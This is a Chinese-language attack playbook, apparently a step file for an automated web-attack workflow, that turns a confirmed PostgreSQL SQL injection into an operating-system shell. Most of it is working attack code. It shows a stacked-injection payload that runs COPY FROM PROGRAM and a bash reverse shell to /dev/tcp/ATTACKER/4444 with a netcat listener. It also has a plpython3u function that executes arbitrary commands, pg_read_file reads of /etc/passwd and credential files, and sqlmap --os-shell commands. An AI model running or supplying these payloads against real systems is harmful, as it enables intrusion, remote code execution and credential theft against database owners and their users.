# PostgreSQL SQLi → Shell 完整攻击链

> 前置：已经通过 HTTP/Web 输入确认 SQL Injection，且后端指纹为 PostgreSQL。
>
> 本文件只负责 **已确认 SQLi → PostgreSQL server-side primitive → Shell**。直接扫描 5432 后连接 PostgreSQL 属于 `/recon`/服务流程。

---

## 第1步 权限门控

```sql
SELECT current_user, current_database(), version();
SELECT rolsuper FROM pg_roles WHERE rolname=current_user;
SELECT pg_has_role(current_user,'pg_read_server_files','MEMBER');
SELECT pg_has_role(current_user,'pg_write_server_files','MEMBER');
SELECT pg_has_role(current_user,'pg_execute_server_program','MEMBER');
```

能力映射：

```text
pg_read_server_files       → 服务器文件读取
pg_write_server_files      → 服务器文件写入
pg_execute_server_program  → COPY ... PROGRAM / server program execution
superuser                  → 可执行高风险数据库能力（仍受OS/环境限制）
```

**关键修正：** `COPY ... PROGRAM` 的相关预定义角色是 `pg_execute_server_program`，不是 `pg_read_server_files`。

---

## 第2步 路径选择

```text
superuser / pg_execute_server_program
    → COPY PROGRAM（首选）

superuser + plpython3u可用
    → PL/Python OS execution

pg_write_server_files
    → 可写文件位置 + WebRoot/脚本/配置组合

pg_read_server_files
    → 读取配置/凭据 → 回到Web入口寻找Shell

高权限但以上受限
    → Large Object / UDF / shared library fallback
```

---

## 第3步 COPY PROGRAM → OS Command

最小验证：

```sql
DROP TABLE IF EXISTS cmd;
CREATE TABLE cmd(data text);
COPY cmd FROM PROGRAM 'id';
SELECT * FROM cmd;
```

stacked SQLi 示例：

```sql
1';DROP TABLE IF EXISTS cmd;CREATE TABLE cmd(data text);
COPY cmd FROM PROGRAM 'id';--
```

如果应用不回显 `SELECT * FROM cmd`，用原有 Boolean/Error/OOB 通道确认命令结果，或者直接进入受控 reverse-shell 验证。

靶场 reverse shell 示例：

```sql
COPY (SELECT '') TO PROGRAM 'bash -c ''bash -i >& /dev/tcp/ATTACKER/4444 0>&1''';
```

Kali：

```bash
rlwrap nc -lvnp 4444
```

拿到 Shell → `/web-attack COMPLETE`。

---

## 第4步 `plpython3u` → OS Command

前提：

```text
通常需要superuser
+
目标安装了PL/Python组件
+
允许创建/使用plpython3u
```

枚举：

```sql
SELECT lanname FROM pg_language;
SELECT name,default_version,installed_version
FROM pg_available_extensions
WHERE name LIKE 'plpython%';
```

如环境允许：

```sql
CREATE EXTENSION IF NOT EXISTS plpython3u;

CREATE OR REPLACE FUNCTION web_cmd(text)
RETURNS text AS $$
import subprocess
return subprocess.check_output(args[0], shell=True, text=True)
$$ LANGUAGE plpython3u;

SELECT web_cmd('id');
```

如果只能盲注，先用 time/OOB/文件 marker 验证，再进入 Shell。

### 恢复

如测试创建了函数：

```sql
DROP FUNCTION IF EXISTS web_cmd(text);
```

不要在不确定生产依赖时卸载共享扩展。

---

## 第5步 Server File Read / Write

### 读取

拥有 `pg_read_server_files` / superuser 时可评估数据库提供的服务器文件读取接口，例如：

```sql
SELECT pg_read_file('/etc/passwd',0,4096);
```

高价值目标：

```text
应用.env / config
pg_hba.conf / postgresql.conf
SSH/服务配置
WebRoot源码和凭据
```

### 写入

拥有 `pg_write_server_files` / superuser 时，先判断目标路径是否可写以及 Web/服务是否会消费该文件。

写文件不等于 Shell；需要形成：

```text
WebRoot可执行脚本
配置注入
任务/服务消费
可加载共享库
```

之一才继续。

---

## 第6步 Large Object / UDF / Shared Library（fallback）

当 `COPY PROGRAM` 不可用，但拥有高权限对象/文件能力时，再评估：

```text
Large Object 导入/导出
自定义C UDF / shared library
可加载路径
目标OS/架构
postgres服务账户文件权限
```

这类链高度依赖版本和文件系统，优先级低于 `COPY PROGRAM` / `plpython3u`。先证实写入点和可加载路径，再构造对象；不要一开始就上传共享库。

---

## 第7步 sqlmap 辅助

```bash
sqlmap -r request.txt -p id --dbms=PostgreSQL --current-user --privileges --batch
```

RCE条件满足时：

```bash
sqlmap -r request.txt -p id --dbms=PostgreSQL --os-shell --batch
```

失败时回本文件判断：

```text
stacked queries是否可用？
pg_execute_server_program？
superuser？
应用是否允许多语句？
目标OS和Shell？
```

---

## 成功门控

```text
PostgreSQL SQLi
    ↓
权限门控
    ↓
COPY PROGRAM / PL-Python / file-UDF fallback
    ↓
稳定OS命令执行
    ↓
Shell obtained
    ↓
/web-attack COMPLETE
```
